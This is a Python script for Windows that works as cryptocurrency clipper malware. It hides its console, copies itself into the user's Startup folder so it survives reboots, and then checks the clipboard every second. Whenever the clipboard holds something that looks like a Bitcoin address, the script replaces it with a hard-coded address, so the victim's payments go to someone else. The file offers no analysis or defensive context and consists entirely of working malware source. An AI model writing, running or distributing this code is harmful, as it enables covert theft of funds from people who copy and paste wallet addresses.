import os
import shutil
import getpass
import ctypes
import time
import win32clipboard

def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def copy_to_startup():
    username = getpass.getuser()
    current_file_path = os.path.abspath(__file__)
    startup_folder = os.path.join('C:\\Users', username, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    new_file_path = os.path.join(startup_folder, 'script.exe')  # Updated name

    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder)
    
    shutil.copy(current_file_path, new_file_path)
    os.system(f'start {new_file_path}')

def get_clipboard_data():
    win32clipboard.OpenClipboard()
    try:
        data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
    except TypeError:
        data = b''
    win32clipboard.CloseClipboard()
    return data.decode('utf-8')

def set_clipboard_data(data):
    win32clipboard.OpenClipboard()
    win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardData(win32clipboard.CF_TEXT, data.encode('utf-8'))
    win32clipboard.CloseClipboard()

def monitor_clipboard(target_address):
    while True:
        clipboard_content = get_clipboard_data()

        if clipboard_content.startswith(('1', '3', 'bc1')) and len(clipboard_content) in range(26, 35):
            if clipboard_content != target_address:
                print(f'> Detected address change: {clipboard_content} -> {target_address}')
                set_clipboard_data(target_address)
            else:
                print('> Address already matches target address.')
        else:
            print('> Clipboard content is not a valid BTC address.')

        time.sleep(1)

if __name__ == "__main__":
    hide_console()
    copy_to_startup()
    target_btc_address = "14qViLJfdGaP4EeHnDyJbEGQysnCpwk3gd"
    monitor_clipboard(target_btc_address)
